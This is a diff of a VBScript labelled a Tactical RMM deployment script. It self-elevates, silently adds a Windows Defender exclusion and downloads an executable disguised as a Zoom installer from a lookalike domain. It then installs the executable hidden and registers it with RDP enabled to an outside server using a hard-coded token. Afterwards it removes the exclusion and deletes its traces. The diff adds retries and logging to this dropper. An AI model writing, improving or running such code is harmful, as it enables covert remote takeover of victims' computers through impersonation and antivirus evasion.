@@ -1,34 +1,136 @@
+' ====================================================
+' Tactical RMM Deployment Script (elevated)
+' ====================================================
+
+' --- Elevate if not running as admin ---
 If Not WScript.Arguments.Named.Exists("elevated") Then
     CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
     WScript.Quit
 End If
 
-Dim oShell
+' --- Setup ---
+Dim oShell, fso, strTemp, logFile, strAgentExe
 Set oShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-Dim strTemp
-strTemp = oShell.ExpandEnvironmentStrings("%TEMP%") & "\ZoomInstaller.exe"
+' Log file (useful for troubleshooting)
+strTemp = oShell.ExpandEnvironmentStrings("%TEMP%")
+logFile = strTemp & "\TacticalRMM_Deploy.log"
 
-' Add Defender exclusion for temp folder
-oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath $env:TEMP""", 0, True
+Sub LogMessage(msg)
+    Dim ts
+    On Error Resume Next
+    Set ts = fso.OpenTextFile(logFile, 8, True)
+    If Not ts Is Nothing Then
+        ts.WriteLine Now & " - " & msg
+        ts.Close
+    End If
+    On Error GoTo 0
+End Sub
 
-' Download TacticalRMM agent
-oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/ZoomInstaller.exe' -OutFile '" & strTemp & "' -UseBasicParsing""", 0, True
+LogMessage "Script started (elevated)."
 
-' Unblock file
-oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strTemp & "'""", 0, True
+' --- Variables ---
+strAgentExe = strTemp & "\ZoomInstaller.exe"   ' Your custom-named Tactical RMM installer
+Dim downloadUrl
+downloadUrl = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/Zoominstaller.exe"   ' <-- REPLACE with your actual URL
+Dim apiUrl, clientId, siteId, agentType, authToken
+apiUrl = "https://api.cacgreatchallange.org"
+clientId = "1"
+siteId = "1"
+agentType = "workstation"
+authToken = "1e58e58d93f27a51ee426f39c79cc1c41b0aa7e644021f0659a7d226c66cef33"
 
-' Install silently
-oShell.Run """" & strTemp & """ /VERYSILENT /SUPPRESSMSGBOXES", 0, True
+' --- 1. Add Defender exclusion for TEMP folder (to avoid blocking) ---
+LogMessage "Adding Defender exclusion for %TEMP%"
+oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath $env:TEMP""", 0, True
 
-' Wait for files to settle
-WScript.Sleep 6000
+' --- 2. Download the agent with retries ---
+LogMessage "Downloading agent from: " & downloadUrl
 
-' Register with server
-oShell.Run """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.cacgreatchallange.org --client-id 1 --site-id 1 --agent-type workstation --auth e88d652cb5e09ed94a4572bbe3ec29b4c0046d0c4ce67e9ae4712faaa8bf3e53 --rdp --ping", 0, True
+Dim downloadSuccess, retries, i
+downloadSuccess = False
+retries = 3
 
-' Remove exclusion after install
-oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath $env:TEMP""", 0, True
+For i = 1 To retries
+    LogMessage "Download attempt " & i & " of " & retries
+    ' Use BITS if available (more reliable), fallback to Invoke-WebRequest
+    Dim psCmd
+    psCmd = "powershell.exe -WindowStyle Hidden -Command ""& {"
+    psCmd = psCmd & "$ProgressPreference='SilentlyContinue'; "
+    psCmd = psCmd & "try { "
+    psCmd = psCmd & "    Start-BitsTransfer -Source '" & downloadUrl & "' -Destination '" & strAgentExe & "' -ErrorAction Stop; "
+    psCmd = psCmd & "} catch { "
+    psCmd = psCmd & "    Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & strAgentExe & "' -UseBasicParsing -ErrorAction Stop; "
+    psCmd = psCmd & "} "
+    psCmd = psCmd & "}"""
+    oShell.Run psCmd, 0, True
+    
+    ' Wait a moment and check if file exists and has size > 0
+    WScript.Sleep 2000
+    If fso.FileExists(strAgentExe) Then
+        Dim fileSize
+        fileSize = fso.GetFile(strAgentExe).Size
+        If fileSize > 100000 Then   ' assume at least 100 KB (adjust as needed)
+            LogMessage "Download successful, size: " & fileSize & " bytes"
+            downloadSuccess = True
+            Exit For
+        Else
+            LogMessage "Downloaded file is too small (" & fileSize & " bytes), retrying..."
+            fso.DeleteFile(strAgentExe)
+        End If
+    Else
+        LogMessage "File not found after download attempt."
+    End If
+    WScript.Sleep 2000
+Next
 
-' Cleanup
-oShell.Run "cmd /c del """ & strTemp & """", 0, True
+If Not downloadSuccess Then
+    LogMessage "ERROR: Failed to download agent after " & retries & " attempts."
+    WScript.Echo "Download failed. Check log: " & logFile
+    WScript.Quit 1
+End If
+
+' --- 3. Unblock file (if downloaded from internet) ---
+LogMessage "Unblocking file"
+oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strAgentExe & "'""", 0, True
+
+' --- 4. Install the agent silently ---
+LogMessage "Installing agent (silent)..."
+' For InnoSetup installers (common with custom RMM builds)
+Dim installCmd
+installCmd = """" & strAgentExe & """ /VERYSILENT /SUPPRESSMSGBOXES /NORESTART"
+oShell.Run installCmd, 0, True
+
+' Wait for install to finish (adjust time if needed)
+LogMessage "Waiting 15 seconds for installation to complete..."
+WScript.Sleep 15000
+
+' Optional: check if TacticalAgent folder exists to confirm install
+If fso.FolderExists("C:\Program Files\TacticalAgent") Then
+    LogMessage "TacticalAgent folder found, installation likely succeeded."
+Else
+    LogMessage "WARNING: TacticalAgent folder not found after install."
+End If
+
+' --- 5. Register the agent with the server ---
+LogMessage "Registering agent with server..."
+Dim regCmd
+regCmd = """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api " & apiUrl & " --client-id " & clientId & " --site-id " & siteId & " --agent-type " & agentType & " --auth " & authToken & " --rdp --ping"
+oShell.Run regCmd, 0, True
+
+LogMessage "Waiting 10 seconds for registration..."
+WScript.Sleep 10000
+
+' --- 6. Remove Defender exclusion (security) ---
+LogMessage "Removing Defender exclusion for %TEMP%"
+oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath $env:TEMP""", 0, True
+
+' --- 7. Cleanup ---
+LogMessage "Cleaning up installer file"
+If fso.FileExists(strAgentExe) Then
+    fso.DeleteFile(strAgentExe)
+End If
+
+LogMessage "Deployment script finished successfully."
+WScript.Echo "Installation complete! Check log for details: " & logFile
